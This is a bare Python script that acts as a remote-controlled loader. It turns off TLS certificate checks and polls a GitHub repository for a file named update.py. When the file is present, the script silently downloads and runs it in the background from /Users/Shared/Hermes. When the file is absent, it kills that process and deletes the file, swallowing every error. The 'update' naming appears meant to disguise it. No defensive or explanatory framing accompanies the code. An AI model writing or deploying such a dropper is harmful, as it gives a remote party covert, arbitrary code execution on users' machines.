import re
import requests
from bs4 import BeautifulSoup
import urllib
import os
import ssl
import time
import subprocess
import sys
import signal

ssl._create_default_https_context = ssl._create_unverified_context

def check_script(git_repo_link, name):
    try:
        r = requests.get(git_repo_link)
        html_doc = r.text
        soup = BeautifulSoup(html_doc, "html.parser")
        file = soup.find_all(title=re.compile(name))
        if file:
            if os.path.exists("/Users/Shared/Hermes/update.py"):
                pass
            else:
                urllib.urlretrieve("https://github.com/3-TA/Loki/raw/main/update.py", "/Users/Shared/Hermes/update.py")
                time.sleep(2)
                p = subprocess.Popen([sys.executable, '/Users/Shared/Hermes/update.py'],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT)
                with open("pid.txt", "w") as f:
                    f.write(str(p.pid))
        else:
            try:
                try:
                    PID = ""
                    with open('pid.txt') as f:
                        PID = f.readline()
                    os.kill(int(PID), signal.SIGKILL)
                except:
                    pass
                os.remove('/Users/Shared/Hermes/update.py')
            except:
                pass
    except:
        pass

check_script('https://github.com/3-TA/Loki/tree/main', 'update.py')
